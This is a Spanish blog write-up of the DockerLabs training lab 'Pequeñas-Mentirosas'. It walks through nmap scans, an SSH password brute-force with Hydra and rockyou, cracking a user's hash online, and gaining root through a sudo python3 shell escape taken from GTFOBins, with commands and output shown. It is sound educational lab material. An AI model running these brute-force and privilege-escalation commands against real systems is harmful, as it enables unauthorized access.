---
title: DockerLabs - Pequeñas-Mentirosas
summary: "Write-up del laboratorio Pequeñas-Mentirosas de DockerLabs"
author: elcybercurioso
date: 2025-10-28 12:00
categories: [Post, DockerLabs]
tags: [fácil, weak credentiales, credentials leaking, sudo]
media_subpath: "/assets/img/posts/dockerlabs_pequenas_mentirosas"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 22:47 GMT
Initiating ARP Ping Scan at 22:47
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 22:47, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:47
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 22:47, 10.13s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.41 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ nmap -sCV -p22,80 172.17.0.2                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 22:48 GMT
Nmap scan report for consolelog.lab (172.17.0.2)
Host is up (0.000056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 9e:10:58:a5:1a:42:9d:be:e5:19:d1:2e:79:9c:ce:21 (ECDSA)
|_  256 6b:a3:a8:84:e0:33:57:fc:44:49:69:41:7d:d3:c9:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
```
## análisis

En la pagina inicial del puerto 80 de la maquina nos encontramos con el siguiente mensaje, el cual nos da una pista de que es lo que debemos buscar:

![Desktop View](/20251027234902.webp){: width="972" height="589" .shadow}

Lo primero que intentamos es ver si a lo que se refieren con la pista es que debemos buscar un parámetro que, si le pasamos el carácter `a`, obtendríamos un resultado que nos permitiría seguir. Sin embargo, nos damos cuenta de que este no es el caso.

Por ello, lo siguiente es ver si `a` se trata de un usuario o una contraseña de SSH, que en este caso encontramos que se trata de un usuario:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ hydra -l a -P /usr/share/seclists/Passwords/rockyou.txt ssh://172.17.0.2 -t 64 -I

[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: a   password: secret
1 of 1 target successfully completed, 1 valid password found
```

Nos conectamos con las credenciales obtenidas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ ssh a@172.17.0.2                                                     
a@172.17.0.2's password: 
a@94ac483a3277:~$ whoami
a
```

Buscamos los ficheros que somos capaces de leer con el usuario actual, filtrando por lo que no nos interesa. De esta manera, encontramos algunos ficheros interesantes en la carpeta `/srv/ftp`:

```bash
a@94ac483a3277:/home$ find / -readable 2>/dev/null | grep -vE '/usr/share/zone|/proc|/sys/devices|/usr/include|/usr|/dev|/etc|/sys|/var|/run'
/
/home
/home/a
/home/a/.profile
/home/a/.bash_logout
/home/a/.bashrc
/home/spencer
/home/spencer/.profile
/home/spencer/.bash_logout
/home/spencer/.bashrc
/opt
/opt/challenges
/opt/scripts
/boot
/media
/tmp
/mnt
/srv
/srv/ftp
/srv/ftp/pista_fuerza_bruta.txt
/srv/ftp/cifrado_aes.enc
/srv/ftp/clave_publica.pem
/srv/ftp/hash_a.txt
/srv/ftp/mensaje_hash.txt
/srv/ftp/original_a.txt
/srv/ftp/mensaje_rsa.enc
/srv/ftp/retos.txt
/srv/ftp/hash_spencer.txt
/srv/ftp/retos_asimetrico.txt
/srv/ftp/clave_privada.pem
/srv/ftp/clave_aes.txt
/bin
/lib64
/lib
/sbin
/.dockerenv
/lib32
```

Los revisamos todos, y el que parece que puede servirnos es el `/srv/ftp/hash_spencer.txt`, ya que si obtenemos la contraseña del usuario `spencer`, podemos movernos lateralmente:

```bash
a@94ac483a3277:/home$ cat /srv/ftp/pista_fuerza_bruta.txt
Realiza un ataque de fuerza bruta para descubrir la contraseña de spencer...
a@94ac483a3277:/home$ cat /srv/ftp/mensaje_hash.txt
Descubre el hash y tendrás la clave...
a@94ac483a3277:/home$ cat /srv/ftp/cifrado_aes.enc
�a@94ac483a3277:/home$ cat /srv/ftp/clave_publica.pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArIk9pr+wSqiRQX/U29k0
kLYyLXlos5Phs7WyZK9LfDz/uBOCTBhBTMGjK5Op21Z9pszXJ6mgoreF/AW+xjTn
XDCh16kaIcACmp1nFOLn09snpk2s1h4cVJygGZmkHQg5rNMPdfn0rRmmnvgGCmim
oaubWuXYLn4Tu8GdRyAAj4P9hkZUMAQu9k1SpLRSIyVlcSisK/vBys8O05rZsZOg
0I7u2d+BuRYA8Px0qnxH1evx+Y3+oerN4823T6Vd+FqmfEHb7QUQ0EAZfJN3CFth
k9z7Q+AODqM5l8kYH2tEXk3xKQPo5qZlc6ep1tIHTERk3m0xEtE8LH157mkzbeli
VQIDAQAB
-----END PUBLIC KEY-----
a@94ac483a3277:/home$ cat /srv/ftp/hash_spencer.txt
7c6a****************************
```

Accedemos a [crackstation.net](https://crackstation.net) para ver si el hash pertenece a una contraseña conocida:

![Desktop View](/20251028000253.webp){: width="972" height="589" .shadow}

Con la credencial recién obtenida, probamos a conectarnos como `spencer`:

```bash
a@94ac483a3277:/home$ su spencer
Password: 
spencer@94ac483a3277:/home$ whoami
spencer
```

## escalada de privilegios

Revisamos los permisos SUDO del usuario `spencer`, y vemos que podemos ejecutar `python3` como el usuario `root`:

```bash
spencer@94ac483a3277:/home$ sudo -l
Matching Defaults entries for spencer on 94ac483a3277:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User spencer may run the following commands on 94ac483a3277:
    (ALL) NOPASSWD: /usr/bin/python3
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo) nos indican que podemos obtener una consola como el usuario `root` cuando tengamos permiso SUDO sobre `python`:

![Desktop View](/20251028000546.webp){: width="972" height="589" .shadow}

Ejecutamos el comando indicado, y ya tendríamos la consola como el usuario `root`:

```bash
spencer@94ac483a3277:/home$ sudo python3 -c 'import os; os.system("/bin/sh")'
# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>